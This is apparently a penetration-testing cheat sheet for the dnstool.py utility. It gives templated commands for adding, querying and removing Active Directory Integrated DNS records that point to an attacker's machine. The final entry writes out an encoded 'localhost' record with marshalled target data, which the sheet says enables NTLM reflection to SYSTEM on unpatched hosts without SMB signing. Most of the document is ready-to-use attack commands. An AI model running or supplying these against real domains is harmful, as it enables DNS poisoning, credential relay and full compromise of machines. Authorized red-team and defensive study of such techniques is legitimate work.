# dnstool.py

% dnstool, dns, Active Directory


## Add a DNS entry to ADIDNS
#assessment/AD #attack_type/Other #port/53 #protocol/dns #access/Domain_user

Add a DNS entry in Active Directory Integrated DNS (ADIDNS) pointing to the attacker machine.

```bash
dnstool.py -u <domain>\\<user> -p <password> --action add -r "<computer_name>.<domain>" -d <attacker_ip> <dc-ip>
```

## Query a DNS entry in ADIDNS
#assessment/AD #attack_type/Other #port/53 #protocol/dns #access/Domain_user

Query a DNS entry in Active Directory Integrated DNS (ADIDNS).

```bash
dnstool.py -u <domain>\\<user> -p <password> --action query -r "<computer_name>.<domain>" <dc-ip>
```

## Query a DNS entry in ForestDNSZones
#assessment/AD #attack_type/Other #port/53 #protocol/dns #access/Domain_user

Query a DNS entry in ForestDNSZones (instead of DomainDNSZones) in Active Directory Integrated DNS (ADIDNS).

```bash
dnstool.py -u <domain>\\<user> -p <password> --action query -r "<computer_name>.<domain>" <dc-ip> --forest
```

## Remove a DNS entry to ADIDNS
#assessment/AD #attack_type/Other #port/53 #protocol/dns #access/Domain_user

Remove a DNS entry in Active Directory Integrated DNS (ADIDNS) pointing to the attacker machine.

```bash
dnstool.py -u <domain>\\<user> -p <password> --action remove -r "<computer_name>.<domain>" -d <attacker_ip> <dc-ip>
```


## Add a DNS entry for localhost with Marshalled info 

Add a DNS entry in Active Directory Integrated DNS (ADIDNS) for localhost with marshalled target information and pointing to the attacker machine. Used to exploit NTLM Reflection attacks, leading to local NTLM authentication on the target and compromise with SYSTEM privilege.

⚠️ Requirement : Target should not have SMB signing enforced and not have applied the security patch from June, 10th 2025.

```bash
dnstool.py -u <domain>\\<user> -p <password> --action add -r "localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" -d <attacker_ip> <dc-ip>
```


= dc-ip: $DC_IP
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
